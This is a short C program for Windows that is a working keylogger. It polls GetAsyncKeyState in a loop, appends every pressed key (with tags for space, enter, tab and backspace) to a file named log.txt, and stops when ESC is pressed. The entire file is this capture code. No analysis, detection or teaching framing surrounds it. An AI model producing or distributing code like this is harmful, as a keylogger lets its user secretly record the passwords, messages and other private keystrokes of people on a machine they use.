#include <stdio.h>
#include <windows.h>

int main()
{
    FILE *logFile;
    char fileName[] = "log.txt";

    printf("Keylogger started... Press ESC to stop.\n");

    while (1)
    {
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) & 0x8000)
            { // Check if key is pressed
                logFile = fopen(fileName, "a+");
                if (logFile == NULL)
                {
                    printf("Error opening log file.\n");
                    return 1;
                }

                // Handle special keys
                switch (key)
                {
                case VK_SPACE:
                    fprintf(logFile, " [SPACE] ");
                    break;
                case VK_RETURN:
                    fprintf(logFile, " [ENTER] \n");
                    break;
                case VK_TAB:
                    fprintf(logFile, " [TAB] ");
                    break;
                case VK_BACK:
                    fprintf(logFile, " [BACKSPACE] ");
                    break;
                case VK_ESCAPE:
                    fprintf(logFile, " [ESC] ");
                    fclose(logFile);
                    return 0;
                default:
                    fprintf(logFile, "%c", key);
                    break;
                }

                fclose(logFile);
                Sleep(120); // Prevent duplicate logging
            }
        }
    }
    return 0;
}
